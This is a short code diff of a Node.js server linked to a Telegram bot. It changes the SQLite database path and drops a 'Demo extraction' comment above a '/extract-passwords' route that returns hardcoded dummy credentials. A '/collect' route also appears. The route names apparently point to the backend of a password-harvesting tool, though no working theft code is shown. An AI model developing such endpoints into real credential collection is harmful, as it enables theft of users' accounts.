@@ -16,9 +16,10 @@ if (!BOT_TOKEN || !ADMIN_ID) {
     process.exit(1);
 }
 
-// ========== DATABASE ==========
-const dbPath = path.join(__dirname, '..', 'shared', 'database.db');
-const db = new sqlite3.Database(dbPath);
+// ========== DATABASE PATH FIX ==========
+// Bot aur server ka database ab bot directory me hai
+const DB_PATH = path.join(__dirname, '..', 'bot', 'database.db');
+const db = new sqlite3.Database(DB_PATH);
 
 db.run(`CREATE TABLE IF NOT EXISTS users (
     user_id INTEGER PRIMARY KEY,
@@ -258,7 +259,6 @@ app.post('/collect', async (req, res) => {
 });
 
 app.post('/extract-passwords', (req, res) => {
-    // Demo extraction
     res.json({
         passwords: [
             { url: 'facebook.com', username: 'demo@email.com', password: 'DemoPass123' },
